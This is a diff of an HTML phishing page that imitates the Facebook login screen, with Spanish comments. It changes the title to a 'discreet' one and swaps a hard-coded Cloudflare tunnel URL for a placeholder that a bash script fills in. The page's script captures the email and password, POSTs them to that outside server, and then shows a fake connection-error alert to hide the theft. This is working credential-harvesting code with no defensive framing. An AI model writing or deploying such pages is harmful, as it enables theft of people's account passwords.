@@ -3,72 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Clone</title>
+    <title>Login Test</title>  <!-- Título discreto -->
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-        }
-        .login-box {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 350px;
-        }
-        h1 {
-            color: #1877f2;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button[type="submit"] {
-            background-color: #1877f2;
-            color: white;
-        }
-        .create-account {
-            background-color: #42b72a;
-            color: white;
-            width: auto;
-            display: inline-block;
-            padding: 10px 16px;
-        }
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        a {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            display: block;
-            margin: 10px 0;
-        }
+        /* Tus estilos actuales (conservados) */
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); width: 350px; }
+        h1 { color: #1877f2; font-size: 24px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        button { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button[type="submit"] { background-color: #1877f2; color: white; }
+        .create-account { background-color: #42b72a; color: white; width: auto; display: inline-block; padding: 10px 16px; }
+        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
+        a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -86,33 +33,26 @@
         </div>
     </div>
 
-    <!-- Script para enviar datos a tu servidor -->
+    <!-- Script con placeholder para el script bash -->
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Evita el envío tradicional
-            
+            event.preventDefault();
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            // Reemplaza con tu URL de Cloudflared (ej: https://tunel-xyz.cfargotunnel.com)
-            const serverUrl = "https://answering-ep-moral-easy.trycloudflare.com/login";
+            // >>> PLACEHOLDER - EL SCRIPT REEMPLAZARÁ ESTA LÍNEA <<<
+            const serverUrl = "https://URL_PLACEHOLDER/login";
 
-            // Envía los datos por POST
             fetch(serverUrl, {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}`
             })
             .then(response => response.text())
             .then(data => {
-                alert("Error de conexión. Intenta más tarde."); // Mensaje simulado
-                console.log("Datos enviados:", { email, password });
+                alert("Error de conexión. Intenta más tarde.");
             })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+            .catch(error => console.error("Error:", error));
         });
     </script>
 </body>
